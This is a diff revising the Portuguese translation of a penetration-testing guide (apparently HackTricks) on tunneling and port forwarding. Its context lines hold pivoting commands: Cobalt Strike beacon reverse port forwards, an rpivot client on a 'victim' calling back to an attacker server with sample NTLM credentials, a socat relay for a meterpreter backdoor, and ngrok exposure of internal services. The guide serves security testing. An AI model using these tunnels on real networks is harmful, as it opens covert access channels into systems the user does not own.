@@ -1,11 +1,11 @@
-# Tunneling and Port Forwarding
+# Tunneling e Encaminhamento de Portas
 
 {{#include ../banners/hacktricks-training.md}}
 
 ## Dica do Nmap
 
 > [!WARNING]
-> **ICMP** e **SYN** scans não podem ser tunelados através de proxies socks, então devemos **desativar a descoberta por ping** (`-Pn`) e especificar **scans TCP** (`-sT`) para que isso funcione.
+> **ICMP** e **SYN** scans não podem ser tunelados através de proxies socks, então devemos **desativar a descoberta de ping** (`-Pn`) e especificar **scans TCP** (`-sT`) para que isso funcione.
 
 ## **Bash**
 
@@ -78,7 +78,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Ative o encaminhamento no lado do servidor
+Ative o encaminhamento no lado do Servidor
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Você pode **tunneling** via **ssh** todo o **tráfego** para uma **sub-rede** através de um host.\
+Você pode **túnel** via **ssh** todo o **tráfego** para uma **sub-rede** através de um host.\
 Por exemplo, encaminhando todo o tráfego que vai para 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -152,15 +152,15 @@ rportfwd stop [bind port]
 ```
 Para notar:
 
-- O **reencaminhamento de porta reverso do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para relatar entre máquinas individuais**.
+- O **reverso de porta do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para retransmitir entre máquinas individuais**.
 - O tráfego é **tuneado dentro do tráfego C2 do Beacon**, incluindo links P2P.
-- **Privilégios de administrador não são necessários** para criar reencaminhamentos de porta reversos em portas altas.
+- **Privilégios de administrador não são necessários** para criar reversos de porta em portas altas.
 
 ### rPort2Port local
 
 > [!WARNING]
 > Neste caso, a **porta é aberta no host do beacon**, não no Servidor da Equipe e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Servidor da Equipe) e de lá para o host:porta indicado.
-```
+```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
@@ -246,7 +246,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Fazer pivot através do **NTLM proxy**
+Pivotar através do **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -276,7 +276,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter através de SSL Socat
+### Meterpreter através do SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -368,14 +368,14 @@ Agora você pode usar [**Proxifier**](https://www.proxifier.com/) **para fazer p
 
 ## Proxificar Aplicativos GUI do Windows
 
-Você pode fazer com que aplicativos GUI do Windows naveguem através de um proxy usando [**Proxifier**](https://www.proxifier.com/).\
-Em **Profile -> Proxy Servers**, adicione o IP e a porta do servidor SOCKS.\
-Em **Profile -> Proxification Rules**, adicione o nome do programa a ser proxificado e as conexões para os IPs que você deseja proxificar.
+Você pode fazer aplicativos GUI do Windows navegarem através de um proxy usando [**Proxifier**](https://www.proxifier.com/).\
+Em **Profile -> Proxy Servers** adicione o IP e a porta do servidor SOCKS.\
+Em **Profile -> Proxification Rules** adicione o nome do programa a ser proxificado e as conexões para os IPs que você deseja proxificar.
 
 ## Bypass de proxy NTLM
 
 A ferramenta mencionada anteriormente: **Rpivot**\
-**OpenVPN** também pode contorná-lo, configurando estas opções no arquivo de configuração:
+**OpenVPN** também pode contorná-lo, configurando essas opções no arquivo de configuração:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -392,7 +392,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Agora, se você configurar, por exemplo, o serviço **SSH** na vítima para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
+Agora, se você configurar, por exemplo, no vítima o serviço **SSH** para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
 Você também poderia usar um **meterpreter** que se conecta a localhost:443 e o atacante está escutando na porta 2222.
 
 ## YARP
@@ -442,7 +442,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Mudar o DNS do proxychains
 
-Proxychains intercepta a chamada `gethostbyname` da libc e encaminha a solicitação de DNS TCP através do proxy socks. Por **padrão**, o servidor **DNS** que o proxychains usa é **4.2.2.2** (hardcoded). Para mudá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **ambiente Windows**, pode definir o IP do **controlador de domínio**.
+Proxychains intercepta a chamada `gethostbyname` da libc e encaminha a solicitação de DNS tcp através do proxy socks. Por **padrão**, o servidor **DNS** que o proxychains usa é **4.2.2.2** (codificado). Para mudá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **ambiente Windows**, pode definir o IP do **controlador de domínio**.
 
 ## Túneis em Go
 
@@ -496,7 +496,7 @@ chmod a+x ./ngrok
 
 **Documentação:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_É também possível adicionar autenticação e TLS, se necessário._
+_Também é possível adicionar autenticação e TLS, se necessário._
 
 #### Tunneling TCP
 ```bash
@@ -511,12 +511,12 @@ _É também possível adicionar autenticação e TLS, se necessário._
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Sniffing HTTP calls
+#### Captura de chamadas HTTP
 
-_Uso útil para XSS, SSRF, SSTI ..._\
+_Utilizado para XSS, SSRF, SSTI ..._\
 Diretamente do stdout ou na interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
-#### Tunneling internal HTTP service
+#### Tunelamento de serviço HTTP interno
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
